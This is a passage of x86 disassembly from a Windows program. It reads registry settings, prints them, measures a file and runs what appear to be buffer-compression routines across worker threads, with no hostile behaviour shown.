  40565b:	push   ecx
  40565c:	push   ecx
  40565d:	push   ecx
  40565e:	push   0x401188
  405663:	push   0x80000002
  405668:	call   DWORD PTR ds:0x40c000
  40566e:	test   eax,eax
  405670:	jne    0x4056a1
  405672:	push   DWORD PTR [ebp+0x8]
  405675:	mov    edx,esi
  405677:	lea    ecx,[ebp-0x4]
  40567a:	call   0x40563a
  40567f:	push   DWORD PTR [ebp-0x4]
  405682:	call   DWORD PTR ds:0x40c00c
  405688:	jmp    0x4056a1
  40568a:	mov    eax,DWORD PTR [ecx]
  40568c:	lea    ecx,[ebp+0x8]
  40568f:	push   0x4
  405691:	push   ecx
  405692:	push   0x4
  405694:	push   0x0
  405696:	push   esi
  405697:	push   eax
  405698:	mov    DWORD PTR [ebp-0x4],eax
  40569b:	call   DWORD PTR ds:0x40c010
  4056a1:	pop    esi
  4056a2:	mov    esp,ebp
  4056a4:	pop    ebp
  4056a5:	ret    0x4
  4056a8:	int3   
  4056a9:	int3   
  4056aa:	int3   
  4056ab:	int3   
  4056ac:	int3   
  4056ad:	mov    edi,edi
  4056af:	push   ebp
  4056b0:	mov    ebp,esp
  4056b2:	cmp    DWORD PTR ds:0x40840c,0x0
  4056b9:	jne    0x4056d6
  4056bb:	cmp    DWORD PTR ds:0x408408,0x0
  4056c2:	je     0x4056da
  4056c4:	push   DWORD PTR [ebp+0x8]
  4056c7:	push   edx
  4056c8:	push   0x4015c4
  4056cd:	call   DWORD PTR ds:0x40c10c
  4056d3:	add    esp,0xc
  4056d6:	pop    ebp
  4056d7:	ret    0x4
  4056da:	xor    ecx,ecx
  4056dc:	pop    ebp
  4056dd:	jmp    0x40563a
  4056e2:	int3   
  4056e3:	int3   
  4056e4:	int3   
  4056e5:	int3   
  4056e6:	int3   
  4056e7:	mov    edi,edi
  4056e9:	push   ebp
  4056ea:	mov    ebp,esp
  4056ec:	sub    esp,0x3c
  4056ef:	push   ebx
  4056f0:	mov    DWORD PTR [ebp-0x14],ecx
  4056f3:	xor    ecx,ecx
  4056f5:	mov    DWORD PTR [ebp-0xc],edx
  4056f8:	mov    DWORD PTR [ebp-0x10],ecx
  4056fb:	mov    DWORD PTR [ebp-0x38],ecx
  4056fe:	mov    DWORD PTR [ebp-0x34],ecx
  405701:	mov    DWORD PTR [ebp-0x30],ecx
  405704:	push   esi
  405705:	push   edi
  405706:	test   edx,edx
  405708:	je     0x405711
  40570a:	push   0x8
  40570c:	pop    ebx
  40570d:	push   0x2
  40570f:	jmp    0x405716
  405711:	xor    ebx,ebx
  405713:	inc    ebx
  405714:	push   0x4
  405716:	mov    DWORD PTR [ebp-0x3c],ebx
  405719:	mov    eax,0x25800
  40571e:	mov    DWORD PTR [ebp-0x24],eax
  405721:	mov    DWORD PTR [ebp-0x1c],0x1000
  405728:	mov    DWORD PTR [ebp-0x18],0x46
  40572f:	pop    edi
  405730:	mov    DWORD PTR [ebp-0x2c],edi
  405733:	test   edx,edx
  405735:	je     0x405745
  405737:	mov    esi,0x258
  40573c:	mov    DWORD PTR [ebp-0x20],0xc800
  405743:	jmp    0x405767
  405745:	mov    DWORD PTR [ebp-0x20],eax
  405748:	mov    eax,DWORD PTR [ebp+0x8]
  40574b:	movzx  eax,WORD PTR [eax]
  40574e:	cmp    eax,0x9
  405751:	je     0x405762
  405753:	cmp    eax,0x6
  405756:	je     0x405762
  405758:	mov    esi,0x640
  40575d:	cmp    eax,0xc
  405760:	jne    0x405767
  405762:	mov    esi,0xc80
  405767:	lea    eax,[ebp-0x8]
  40576a:	mov    DWORD PTR [ebp-0x28],esi
  40576d:	push   eax
  40576e:	push   0x20119
  405773:	push   ecx
  405774:	push   0x401188
  405779:	push   0x80000002
  40577e:	call   DWORD PTR ds:0x40c008
  405784:	test   eax,eax
  405786:	jne    0x40587f
  40578c:	mov    ecx,DWORD PTR [ebp-0x8]
  40578f:	lea    eax,[ebp-0x4]
  405792:	push   eax
  405793:	mov    edx,0x4015d8
  405798:	call   0x405574
  40579d:	test   eax,eax
  40579f:	je     0x4057a7
  4057a1:	mov    ebx,DWORD PTR [ebp-0x4]
  4057a4:	mov    DWORD PTR [ebp-0x3c],ebx
  4057a7:	test   bl,0x2
  4057aa:	jne    0x4057c7
  4057ac:	mov    ecx,DWORD PTR [ebp-0x8]
  4057af:	lea    eax,[ebp-0x4]
  4057b2:	push   eax
  4057b3:	mov    edx,0x4015e4
  4057b8:	call   0x405574
  4057bd:	test   eax,eax
  4057bf:	je     0x4057c7
  4057c1:	mov    edi,DWORD PTR [ebp-0x4]
  4057c4:	mov    DWORD PTR [ebp-0x2c],edi
  4057c7:	test   bl,0x4
  4057ca:	jne    0x4057ee
  4057cc:	mov    ecx,DWORD PTR [ebp-0x8]
  4057cf:	lea    eax,[ebp-0x4]
  4057d2:	push   eax
  4057d3:	mov    edx,0x401608
  4057d8:	call   0x405574
  4057dd:	test   eax,eax
  4057df:	je     0x4057ee
  4057e1:	mov    esi,DWORD PTR [ebp-0x4]
  4057e4:	mov    DWORD PTR [ebp-0x30],0x1
  4057eb:	mov    DWORD PTR [ebp-0x28],esi
  4057ee:	test   bl,0x8
  4057f1:	jne    0x40580e
  4057f3:	mov    ecx,DWORD PTR [ebp-0x8]
  4057f6:	lea    eax,[ebp-0x4]
  4057f9:	push   eax
  4057fa:	mov    edx,0x401624
  4057ff:	call   0x405574
  405804:	test   eax,eax
  405806:	je     0x40580e
  405808:	mov    eax,DWORD PTR [ebp-0x4]
  40580b:	mov    DWORD PTR [ebp-0x24],eax
  40580e:	test   bl,0x10
  405811:	jne    0x405837
  405813:	mov    ecx,DWORD PTR [ebp-0x8]
  405816:	lea    eax,[ebp-0x4]
  405819:	push   eax
  40581a:	mov    edx,0x401644
  40581f:	call   0x405574
  405824:	test   eax,eax
  405826:	je     0x405837
  405828:	xor    eax,eax
  40582a:	inc    eax
  40582b:	mov    DWORD PTR [ebp-0x10],eax
  40582e:	mov    DWORD PTR [ebp-0x34],eax
  405831:	mov    eax,DWORD PTR [ebp-0x4]
  405834:	mov    DWORD PTR [ebp-0x20],eax
  405837:	test   bl,0x20
  40583a:	jne    0x405857
  40583c:	mov    ecx,DWORD PTR [ebp-0x8]
  40583f:	lea    eax,[ebp-0x4]
  405842:	push   eax
  405843:	mov    edx,0x401674
  405848:	call   0x405574
  40584d:	test   eax,eax
  40584f:	je     0x405857
  405851:	mov    eax,DWORD PTR [ebp-0x4]
  405854:	mov    DWORD PTR [ebp-0x1c],eax
  405857:	test   bl,bl
  405859:	js     0x405876
  40585b:	mov    ecx,DWORD PTR [ebp-0x8]
  40585e:	lea    eax,[ebp-0x4]
  405861:	push   eax
  405862:	mov    edx,0x401698
  405867:	call   0x405574
  40586c:	test   eax,eax
  40586e:	je     0x405876
  405870:	mov    eax,DWORD PTR [ebp-0x4]
  405873:	mov    DWORD PTR [ebp-0x18],eax
  405876:	push   DWORD PTR [ebp-0x8]
  405879:	call   DWORD PTR ds:0x40c00c
  40587f:	cmp    DWORD PTR ds:0x408408,0x0
  405886:	je     0x40597e
  40588c:	push   0x4016c0
  405891:	call   DWORD PTR ds:0x40c10c
  405897:	mov    DWORD PTR [esp],0x4016d0
  40589e:	call   DWORD PTR ds:0x40c10c
  4058a4:	push   ebx
  4058a5:	push   0x4016e0
  4058aa:	call   DWORD PTR ds:0x40c10c
  4058b0:	add    esp,0xc
  4058b3:	test   bl,0x2
  4058b6:	jne    0x4058c6
  4058b8:	push   edi
  4058b9:	push   0x4016ec
  4058be:	call   DWORD PTR ds:0x40c10c
  4058c4:	pop    ecx
  4058c5:	pop    ecx
  4058c6:	test   bl,0x4
  4058c9:	jne    0x4058d9
  4058cb:	push   esi
  4058cc:	push   0x401704
  4058d1:	call   DWORD PTR ds:0x40c10c
  4058d7:	pop    ecx
  4058d8:	pop    ecx
  4058d9:	test   bl,0x8
  4058dc:	jne    0x4058f6
  4058de:	mov    ecx,DWORD PTR [ebp-0x24]
  4058e1:	mov    eax,ecx
  4058e3:	shr    eax,0xa
  4058e6:	push   eax
  4058e7:	push   ecx
  4058e8:	push   0x401718
  4058ed:	call   DWORD PTR ds:0x40c10c
  4058f3:	add    esp,0xc
  4058f6:	test   bl,0x10
  4058f9:	jne    0x40593a
  4058fb:	mov    ecx,DWORD PTR [ebp-0x20]
  4058fe:	mov    eax,ecx
  405900:	shr    eax,0xa
  405903:	push   eax
  405904:	push   ecx
  405905:	push   0x401738
  40590a:	call   DWORD PTR ds:0x40c10c
  405910:	mov    esi,DWORD PTR [ebp-0xc]
  405913:	add    esp,0xc
  405916:	cmp    DWORD PTR [ebp-0x10],0x0
  40591a:	jne    0x40593d
  40591c:	test   esi,esi
  40591e:	jne    0x40593d
  405920:	push   0xc8
  405925:	push   0x32000
  40592a:	push   0x401760
  40592f:	call   DWORD PTR ds:0x40c10c
  405935:	add    esp,0xc
  405938:	jmp    0x40593d
  40593a:	mov    esi,DWORD PTR [ebp-0xc]
  40593d:	test   bl,bl
  40593f:	js     0x405951
  405941:	push   DWORD PTR [ebp-0x18]
  405944:	push   0x4017a0
  405949:	call   DWORD PTR ds:0x40c10c
  40594f:	pop    ecx
  405950:	pop    ecx
  405951:	test   esi,esi
  405953:	je     0x405972
  405955:	test   bl,0x20
  405958:	jne    0x405972
  40595a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40595d:	mov    eax,ecx
  40595f:	shr    eax,0xa
  405962:	push   eax
  405963:	push   ecx
  405964:	push   0x4017bc
  405969:	call   DWORD PTR ds:0x40c10c
  40596f:	add    esp,0xc
  405972:	push   0x4017e0
  405977:	call   DWORD PTR ds:0x40c10c
  40597d:	pop    ecx
  40597e:	mov    edi,DWORD PTR [ebp-0x14]
  405981:	lea    esi,[ebp-0x3c]
  405984:	push   0xa
  405986:	pop    ecx
  405987:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405989:	pop    edi
  40598a:	pop    esi
  40598b:	pop    ebx
  40598c:	mov    esp,ebp
  40598e:	pop    ebp
  40598f:	ret    0x4
  405992:	int3   
  405993:	int3   
  405994:	int3   
  405995:	int3   
  405996:	int3   
  405997:	mov    edi,edi
  405999:	push   ebp
  40599a:	mov    ebp,esp
  40599c:	sub    esp,0x2c
  40599f:	mov    eax,ds:0x408008
  4059a4:	xor    eax,ebp
  4059a6:	mov    DWORD PTR [ebp-0x4],eax
  4059a9:	push   ebx
  4059aa:	push   esi
  4059ab:	push   edi
  4059ac:	xor    eax,eax
  4059ae:	push   eax
  4059af:	push   0x2000000
  4059b4:	push   0x3
  4059b6:	push   eax
  4059b7:	push   0x7
  4059b9:	push   0x80
  4059be:	push   ecx
  4059bf:	mov    edi,eax
  4059c1:	mov    DWORD PTR [ebp-0x24],eax
  4059c4:	call   DWORD PTR ds:0x40c068
  4059ca:	mov    ebx,eax
  4059cc:	cmp    ebx,0xffffffff
  4059cf:	je     0x405a2d
  4059d1:	push   0x3
  4059d3:	push   0x18
  4059d5:	lea    eax,[ebp-0x20]
  4059d8:	push   eax
  4059d9:	lea    eax,[ebp-0x28]
  4059dc:	push   eax
  4059dd:	push   ebx
  4059de:	call   DWORD PTR ds:0x40c198
  4059e4:	push   ebx
  4059e5:	mov    esi,eax
  4059e7:	call   DWORD PTR ds:0x40c0f4
  4059ed:	test   esi,esi
  4059ef:	js     0x405a2d
  4059f1:	mov    eax,DWORD PTR [ebp-0x10]
  4059f4:	mul    DWORD PTR [ebp-0xc]
  4059f7:	push   DWORD PTR [ebp-0x1c]
  4059fa:	push   DWORD PTR [ebp-0x20]
  4059fd:	push   edx
  4059fe:	push   eax
  4059ff:	call   0x407730
  405a04:	xor    ebx,ebx
  405a06:	mov    esi,0x400
  405a0b:	push   ebx
  405a0c:	push   esi
  405a0d:	push   edx
  405a0e:	push   eax
  405a0f:	call   0x407590
  405a14:	push   ebx
  405a15:	push   esi
  405a16:	push   edx
  405a17:	push   eax
  405a18:	call   0x407590
  405a1d:	mov    edi,eax
  405a1f:	cmp    edx,ebx
  405a21:	jl     0x405a2d
  405a23:	jg     0x405a2a
  405a25:	cmp    edi,0xffffffff
  405a28:	jbe    0x405a2d
  405a2a:	or     edi,0xffffffff
  405a2d:	mov    ecx,DWORD PTR [ebp-0x4]
  405a30:	mov    eax,edi
  405a32:	pop    edi
  405a33:	pop    esi
  405a34:	xor    ecx,ebp
  405a36:	pop    ebx
  405a37:	call   0x406fc0
  405a3c:	mov    esp,ebp
  405a3e:	pop    ebp
  405a3f:	ret    
  405a40:	int3   
  405a41:	int3   
  405a42:	int3   
  405a43:	int3   
  405a44:	int3   
  405a45:	int3   
  405a46:	int3   
  405a47:	int3   
  405a48:	int3   
  405a49:	int3   
  405a4a:	int3   
  405a4b:	int3   
  405a4c:	int3   
  405a4d:	int3   
  405a4e:	int3   
  405a4f:	int3   
  405a50:	mov    edi,edi
  405a52:	push   ebp
  405a53:	mov    ebp,esp
  405a55:	sub    esp,0x30
  405a58:	mov    eax,fs:0x30
  405a5e:	push   ebx
  405a5f:	push   esi
  405a60:	mov    esi,DWORD PTR [ebp+0x8]
  405a63:	xor    ebx,ebx
  405a65:	and    DWORD PTR [ebp-0xc],ebx
  405a68:	push   edi
  405a69:	mov    DWORD PTR [ebp-0x24],ebx
  405a6c:	push   DWORD PTR [esi+0x30]
  405a6f:	push   ebx
  405a70:	push   DWORD PTR [eax+0x18]
  405a73:	call   DWORD PTR ds:0x40c188
  405a79:	xor    edi,edi
  405a7b:	mov    DWORD PTR [ebp-0x8],eax
  405a7e:	inc    edi
  405a7f:	test   eax,eax
  405a81:	je     0x405b44
  405a87:	push   DWORD PTR [esi+0x30]
  405a8a:	mov    eax,fs:0x30
  405a90:	push   ebx
  405a91:	push   DWORD PTR [eax+0x18]
  405a94:	call   DWORD PTR ds:0x40c188
  405a9a:	mov    ebx,eax
  405a9c:	mov    DWORD PTR [ebp-0x24],ebx
  405a9f:	test   ebx,ebx
  405aa1:	je     0x405b44
  405aa7:	movzx  ecx,WORD PTR [esi+0x3a]
  405aab:	lea    eax,[ebp-0x10]
  405aae:	push   eax
  405aaf:	lea    eax,[ebp-0x14]
  405ab2:	push   eax
  405ab3:	push   ecx
  405ab4:	call   DWORD PTR ds:0x40c17c
  405aba:	test   eax,eax
  405abc:	js     0x405b44
  405ac2:	mov    eax,DWORD PTR [ebp-0x14]
  405ac5:	cmp    eax,DWORD PTR [ebp-0x10]
  405ac8:	ja     0x405ad0
  405aca:	mov    eax,DWORD PTR [ebp-0x10]
  405acd:	mov    DWORD PTR [ebp-0x14],eax
  405ad0:	test   eax,eax
  405ad2:	je     0x405aed
  405ad4:	push   eax
  405ad5:	mov    eax,fs:0x30
  405adb:	push   0x0
  405add:	push   DWORD PTR [eax+0x18]
  405ae0:	call   DWORD PTR ds:0x40c188
  405ae6:	mov    DWORD PTR [ebp-0xc],eax
  405ae9:	test   eax,eax
  405aeb:	je     0x405b44
  405aed:	push   DWORD PTR [esi+0x30]
  405af0:	push   DWORD PTR [esi+0x3c]
  405af3:	push   ebx
  405af4:	call   0x40789e
  405af9:	add    esp,0xc
  405afc:	mov    DWORD PTR [ebp-0x18],0x14
  405b03:	lea    eax,[ebp-0x18]
  405b06:	push   0x4
  405b08:	push   eax
  405b09:	push   0x19
  405b0b:	push   0xfffffffe
  405b0d:	call   DWORD PTR ds:0x40c194
  405b13:	test   eax,eax
  405b15:	jns    0x405b47
  405b17:	lea    eax,[ebp-0x2c]
  405b1a:	mov    DWORD PTR [ebp-0x28],0xe
  405b21:	push   eax
  405b22:	push   edi
  405b23:	push   edi
  405b24:	lea    eax,[ebp-0x28]
  405b27:	push   eax
  405b28:	call   DWORD PTR ds:0x40c178
  405b2e:	test   eax,eax
  405b30:	js     0x405b47
  405b32:	push   0x4
  405b34:	lea    eax,[ebp-0x18]
  405b37:	push   eax
  405b38:	push   0x19
  405b3a:	push   0xfffffffe
  405b3c:	call   DWORD PTR ds:0x40c194
  405b42:	jmp    0x405b47
  405b44:	mov    DWORD PTR [esi+0x2c],edi
  405b47:	mov    eax,edi
  405b49:	lock xadd DWORD PTR [esi+0x20],eax
  405b4e:	inc    eax
  405b4f:	cmp    eax,DWORD PTR [esi+0x1c]
  405b52:	jne    0x405b5d
  405b54:	push   DWORD PTR [esi+0x10]
  405b57:	call   DWORD PTR ds:0x40c0a4
  405b5d:	push   0xffffffff
  405b5f:	push   DWORD PTR [esi+0x14]
  405b62:	call   DWORD PTR ds:0x40c0a8
  405b68:	cmp    DWORD PTR [esi+0x2c],0x0
  405b6c:	je     0x405b78
  405b6e:	mov    esi,0x4d3
  405b73:	jmp    0x405c4f
  405b78:	mov    eax,edi
  405b7a:	lock xadd DWORD PTR [esi+0x24],eax
  405b7f:	inc    eax
  405b80:	cmp    eax,edi
  405b82:	jne    0x405b8b
  405b84:	push   esi
  405b85:	call   DWORD PTR ds:0x40c0d0
  405b8b:	xor    edx,edx
  405b8d:	xor    eax,eax
  405b8f:	mov    DWORD PTR [ebp-0x28],edx
  405b92:	cmp    ax,WORD PTR [esi+0x38]
  405b96:	jae    0x405c2f
  405b9c:	mov    edi,DWORD PTR [ebp-0x8]
  405b9f:	mov    eax,DWORD PTR [esi+0x30]
  405ba2:	mov    ecx,edi
  405ba4:	add    eax,edi
  405ba6:	mov    DWORD PTR [ebp-0x1c],ecx
  405ba9:	mov    DWORD PTR [ebp-0x2c],eax
  405bac:	mov    DWORD PTR [ebp-0x4],ebx
  405baf:	cmp    edi,eax
  405bb1:	jae    0x405c1c
  405bb3:	mov    edi,DWORD PTR [ebp-0xc]
  405bb6:	xor    edx,edx
  405bb8:	mov    DWORD PTR [ebp-0x20],edx
  405bbb:	mov    ebx,eax
  405bbd:	mov    eax,DWORD PTR [esi+0x40]
  405bc0:	mov    eax,DWORD PTR [edx+eax*1]
  405bc3:	cmp    eax,DWORD PTR [esi+0x34]
  405bc6:	jne    0x405bd9
  405bc8:	push   DWORD PTR [esi+0x34]
  405bcb:	push   DWORD PTR [ebp-0x4]
  405bce:	push   ecx
  405bcf:	call   0x40789e
  405bd4:	add    esp,0xc
  405bd7:	jmp    0x405bf1
  405bd9:	push   edi
  405bda:	lea    edx,[ebp-0x30]
  405bdd:	push   edx
  405bde:	push   eax
  405bdf:	push   DWORD PTR [ebp-0x4]
  405be2:	movzx  eax,WORD PTR [esi+0x3a]
  405be6:	push   DWORD PTR [esi+0x34]
  405be9:	push   ecx
  405bea:	push   eax
  405beb:	call   DWORD PTR ds:0x40c180
  405bf1:	mov    edx,DWORD PTR [ebp-0x20]
  405bf4:	mov    eax,DWORD PTR [esi+0x40]
  405bf7:	mov    ecx,DWORD PTR [ebp-0x4]
  405bfa:	add    ecx,DWORD PTR [edx+eax*1]
  405bfd:	add    edx,0x4
  405c00:	mov    DWORD PTR [ebp-0x4],ecx
  405c03:	mov    ecx,DWORD PTR [ebp-0x1c]
  405c06:	add    ecx,DWORD PTR [esi+0x34]
  405c09:	mov    DWORD PTR [ebp-0x1c],ecx
  405c0c:	mov    DWORD PTR [ebp-0x20],edx
  405c0f:	cmp    ecx,ebx
  405c11:	jb     0x405bbd
  405c13:	mov    ebx,DWORD PTR [ebp-0x24]
  405c16:	mov    edi,DWORD PTR [ebp-0x8]
  405c19:	mov    edx,DWORD PTR [ebp-0x28]
  405c1c:	movzx  eax,WORD PTR [esi+0x38]
  405c20:	inc    edx
  405c21:	mov    DWORD PTR [ebp-0x28],edx
  405c24:	cmp    edx,eax
  405c26:	jb     0x405b9f
  405c2c:	xor    edi,edi
  405c2e:	inc    edi
  405c2f:	lock xadd DWORD PTR [esi+0x28],edi
  405c34:	inc    edi
  405c35:	cmp    edi,DWORD PTR [esi+0x1c]
  405c38:	jne    0x405c4d
  405c3a:	lea    eax,[esi+0x8]
  405c3d:	push   eax
  405c3e:	call   DWORD PTR ds:0x40c0d0
  405c44:	push   DWORD PTR [esi+0x18]
  405c47:	call   DWORD PTR ds:0x40c0a4
  405c4d:	xor    esi,esi
  405c4f:	mov    eax,DWORD PTR [ebp-0x8]
  405c52:	test   eax,eax
  405c54:	je     0x405c68
  405c56:	push   eax
  405c57:	mov    eax,fs:0x30
  405c5d:	push   0x0
  405c5f:	push   DWORD PTR [eax+0x18]
  405c62:	call   DWORD PTR ds:0x40c19c
  405c68:	test   ebx,ebx
  405c6a:	je     0x405c7e
  405c6c:	mov    eax,fs:0x30
  405c72:	push   ebx
  405c73:	push   0x0
  405c75:	push   DWORD PTR [eax+0x18]
  405c78:	call   DWORD PTR ds:0x40c19c
  405c7e:	mov    eax,DWORD PTR [ebp-0xc]
  405c81:	test   eax,eax
  405c83:	je     0x405c98
  405c85:	mov    ecx,DWORD PTR fs:0x30
  405c8c:	push   eax
  405c8d:	push   0x0
  405c8f:	push   DWORD PTR [ecx+0x18]
  405c92:	call   DWORD PTR ds:0x40c19c
  405c98:	pop    edi
  405c99:	mov    eax,esi
  405c9b:	pop    esi
  405c9c:	pop    ebx
  405c9d:	mov    esp,ebp
  405c9f:	pop    ebp
  405ca0:	ret    0x4
  405ca3:	int3   
  405ca4:	int3   
  405ca5:	int3   
  405ca6:	int3   
  405ca7:	int3   
  405ca8:	mov    edi,edi
  405caa:	push   ebp
  405cab:	mov    ebp,esp
  405cad:	sub    esp,0x1c
  405cb0:	push   ebx
  405cb1:	push   esi
  405cb2:	push   edi
  405cb3:	push   0x8
  405cb5:	pop    ebx
  405cb6:	lea    eax,[ebp-0x10]
  405cb9:	mov    DWORD PTR [ebp-0x4],edx
  405cbc:	push   eax
  405cbd:	mov    esi,ecx
  405cbf:	lea    eax,[ebp-0x14]
  405cc2:	push   eax
  405cc3:	xor    edi,edi
  405cc5:	and    DWORD PTR [ebp-0xc],edi
  405cc8:	movzx  eax,WORD PTR [esi+0x3a]
  405ccc:	and    DWORD PTR [ebp-0x8],edi
  405ccf:	push   eax
  405cd0:	call   DWORD PTR ds:0x40c17c
  405cd6:	test   eax,eax
  405cd8:	jns    0x405ce8
  405cda:	push   eax
  405cdb:	call   DWORD PTR ds:0x40c18c
  405ce1:	mov    ebx,eax
  405ce3:	jmp    0x405ddf
  405ce8:	mov    eax,DWORD PTR [ebp-0x14]
  405ceb:	cmp    eax,DWORD PTR [ebp-0x10]
  405cee:	ja     0x405cf6
  405cf0:	mov    eax,DWORD PTR [ebp-0x10]
  405cf3:	mov    DWORD PTR [ebp-0x14],eax
  405cf6:	test   eax,eax
  405cf8:	je     0x405d17
  405cfa:	push   eax
  405cfb:	mov    eax,fs:0x30
  405d01:	push   0x0
  405d03:	push   DWORD PTR [eax+0x18]
  405d06:	call   DWORD PTR ds:0x40c188
  405d0c:	mov    DWORD PTR [ebp-0x8],eax
  405d0f:	test   eax,eax
  405d11:	je     0x405e12
  405d17:	push   DWORD PTR [esi+0x30]
  405d1a:	mov    ecx,DWORD PTR fs:0x30
  405d21:	push   0x0
  405d23:	push   DWORD PTR [ecx+0x18]
  405d26:	call   DWORD PTR ds:0x40c188
  405d2c:	mov    edi,eax
  405d2e:	mov    DWORD PTR [ebp-0x1c],edi
  405d31:	test   edi,edi
  405d33:	je     0x405dc6
  405d39:	mov    eax,DWORD PTR [esi+0x30]
  405d3c:	xor    edx,edx
  405d3e:	div    DWORD PTR [esi+0x34]
  405d41:	shl    eax,0x2
  405d44:	push   eax
  405d45:	mov    eax,fs:0x30
  405d4b:	push   0x0
  405d4d:	push   DWORD PTR [eax+0x18]
  405d50:	call   DWORD PTR ds:0x40c188
  405d56:	mov    DWORD PTR [ebp-0xc],eax
  405d59:	test   eax,eax
  405d5b:	je     0x405dc6
  405d5d:	mov    ebx,DWORD PTR [ebp-0x4]
  405d60:	mov    ecx,edi
  405d62:	mov    edx,DWORD PTR [esi+0x30]
  405d65:	add    edx,ebx
  405d67:	mov    DWORD PTR [ebp-0x4],ecx
  405d6a:	mov    DWORD PTR [ebp-0x18],edx
  405d6d:	cmp    ebx,edx
  405d6f:	jae    0x405dbe
  405d71:	mov    edi,eax
  405d73:	push   DWORD PTR [ebp-0x8]
  405d76:	movzx  eax,WORD PTR [esi+0x3a]
  405d7a:	push   edi
  405d7b:	push   DWORD PTR [esi+0x34]
  405d7e:	push   DWORD PTR [esi+0x34]
  405d81:	push   ecx
  405d82:	push   DWORD PTR [esi+0x34]
  405d85:	push   ebx
  405d86:	push   eax
  405d87:	call   DWORD PTR ds:0x40c190
  405d8d:	test   eax,eax
  405d8f:	jns    0x405da5
  405d91:	mov    eax,DWORD PTR [esi+0x34]
  405d94:	mov    DWORD PTR [edi],eax
  405d96:	push   DWORD PTR [esi+0x34]
  405d99:	push   ebx
  405d9a:	push   DWORD PTR [ebp-0x4]
  405d9d:	call   0x40789e
  405da2:	add    esp,0xc
  405da5:	mov    ecx,DWORD PTR [ebp-0x4]
  405da8:	add    ecx,DWORD PTR [edi]
  405daa:	add    edi,0x4
  405dad:	add    ebx,DWORD PTR [esi+0x34]
  405db0:	mov    DWORD PTR [ebp-0x4],ecx
  405db3:	cmp    ebx,DWORD PTR [ebp-0x18]
  405db6:	jb     0x405d73
  405db8:	mov    edi,DWORD PTR [ebp-0x1c]
  405dbb:	mov    eax,DWORD PTR [ebp-0xc]
  405dbe:	mov    DWORD PTR [esi+0x3c],edi
  405dc1:	xor    ebx,ebx
  405dc3:	mov    DWORD PTR [esi+0x40],eax
  405dc6:	mov    eax,DWORD PTR [ebp-0x8]
  405dc9:	test   eax,eax
  405dcb:	je     0x405ddf
  405dcd:	push   eax
  405dce:	mov    eax,fs:0x30
  405dd4:	push   0x0
  405dd6:	push   DWORD PTR [eax+0x18]
  405dd9:	call   DWORD PTR ds:0x40c19c
  405ddf:	test   ebx,ebx
  405de1:	je     0x405e12
  405de3:	test   edi,edi
  405de5:	je     0x405df9
  405de7:	mov    eax,fs:0x30
  405ded:	push   edi
  405dee:	push   0x0
  405df0:	push   DWORD PTR [eax+0x18]
  405df3:	call   DWORD PTR ds:0x40c19c
  405df9:	mov    eax,DWORD PTR [ebp-0xc]
  405dfc:	test   eax,eax
  405dfe:	je     0x405e12
  405e00:	push   eax
  405e01:	mov    eax,fs:0x30
  405e07:	push   0x0
  405e09:	push   DWORD PTR [eax+0x18]
  405e0c:	call   DWORD PTR ds:0x40c19c
  405e12:	pop    edi
  405e13:	pop    esi
  405e14:	mov    eax,ebx
  405e16:	pop    ebx
  405e17:	mov    esp,ebp
  405e19:	pop    ebp
  405e1a:	ret    
  405e1b:	int3   
  405e1c:	int3   
  405e1d:	int3   
  405e1e:	int3   
  405e1f:	int3   
  405e20:	mov    edi,edi
  405e22:	push   ebp
  405e23:	mov    ebp,esp
  405e25:	sub    esp,0x64
  405e28:	push   ebx
  405e29:	push   esi
  405e2a:	push   edi
  405e2b:	push   0x48
  405e2d:	lea    eax,[ebp-0x60]
  405e30:	mov    edi,ecx
  405e32:	push   0x0
  405e34:	push   eax
  405e35:	mov    DWORD PTR [ebp-0x4],edi
  405e38:	call   0x4078aa
  405e3d:	mov    eax,DWORD PTR [ebp+0x10]
  405e40:	add    esp,0xc
  405e43:	mov    DWORD PTR [ebp-0x2c],eax
  405e46:	mov    esi,edi
  405e48:	shl    esi,0x2
  405e4b:	mov    DWORD PTR [ebp-0x30],0x200000
  405e52:	push   0x4
  405e54:	pop    eax
  405e55:	mov    WORD PTR [ebp-0x26],ax
  405e59:	mov    eax,fs:0x30
  405e5f:	push   esi
  405e60:	push   0x0
  405e62:	push   DWORD PTR [eax+0x18]
  405e65:	call   DWORD PTR ds:0x40c188
  405e6b:	mov    ebx,eax
  405e6d:	test   ebx,ebx
  405e6f:	jne    0x405e79
  405e71:	push   0x8
  405e73:	pop    esi
  405e74:	jmp    0x406031
  405e79:	push   esi
  405e7a:	xor    esi,esi
  405e7c:	push   esi
  405e7d:	push   ebx
  405e7e:	call   0x4078aa
  405e83:	add    esp,0xc
  405e86:	push   esi
  405e87:	push   esi
  405e88:	push   0x1
  405e8a:	push   esi
  405e8b:	call   DWORD PTR ds:0x40c090
  405e91:	mov    DWORD PTR [ebp-0x50],eax
  405e94:	test   eax,eax
  405e96:	jne    0x405ea5
  405e98:	call   DWORD PTR ds:0x40c048
  405e9e:	mov    esi,eax
  405ea0:	jmp    0x405ff4
  405ea5:	push   esi
  405ea6:	push   esi
  405ea7:	push   0x1
  405ea9:	push   esi
  405eaa:	call   DWORD PTR ds:0x40c090
  405eb0:	mov    DWORD PTR [ebp-0x4c],eax
  405eb3:	test   eax,eax
  405eb5:	je     0x405e98
  405eb7:	push   esi
  405eb8:	push   esi
  405eb9:	push   0x1
  405ebb:	push   esi
  405ebc:	call   DWORD PTR ds:0x40c090
  405ec2:	mov    DWORD PTR [ebp-0x48],eax
  405ec5:	test   eax,eax
  405ec7:	je     0x405e98
  405ec9:	mov    edx,DWORD PTR [ebp+0x14]
  405ecc:	lea    ecx,[ebp-0x60]
  405ecf:	call   0x405ca8
  405ed4:	mov    esi,eax
  405ed6:	test   esi,esi
  405ed8:	jne    0x405ff4
  405ede:	mov    DWORD PTR [ebp-0x44],edi
  405ee1:	push   0x4
  405ee3:	pop    eax
  405ee4:	mov    WORD PTR [ebp-0x28],ax
  405ee8:	test   edi,edi
  405eea:	je     0x405f10
  405eec:	push   0x0
  405eee:	push   0x0
  405ef0:	lea    eax,[ebp-0x60]
  405ef3:	push   eax
  405ef4:	push   0x405a50
  405ef9:	push   0x0
  405efb:	push   0x0
  405efd:	call   DWORD PTR ds:0x40c0f8
  405f03:	mov    DWORD PTR [ebx+esi*4],eax
  405f06:	test   eax,eax
  405f08:	je     0x405f32
  405f0a:	inc    esi
  405f0b:	cmp    esi,DWORD PTR [ebp-0x44]
  405f0e:	jb     0x405eec
  405f10:	push   0xffffffff
  405f12:	push   DWORD PTR [ebp-0x50]
